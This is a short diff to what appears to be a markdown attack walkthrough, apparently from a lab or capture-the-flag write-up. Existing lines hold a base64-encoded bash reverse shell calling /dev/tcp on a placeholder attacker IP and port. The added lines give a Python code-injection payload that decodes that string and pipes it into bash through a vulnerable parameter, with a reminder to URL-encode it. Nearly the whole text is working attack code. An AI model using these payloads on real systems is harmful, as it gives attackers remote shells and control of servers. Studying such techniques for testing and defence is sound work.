@@ -51,3 +51,8 @@ To get a reverse shell, do the following:
 ```bash
 echo -n "bash -c 'bash -i >& /dev/tcp/$(ATTACKER_IP)/$(ATTACKER_PORT) 0>&1'" | base64
 ```
+Add the following payload to the vulnerable parameter:
+```
+__import__('os').system('echo -n $OUTPUT_OF_PREVIOUS_COMMAND | base64 -d | bash')
+```
+REMEMBER TO URL ENCODE THE PAYLOAD!!! Make sure characters such as + are encoded and not mistaken for spaces!
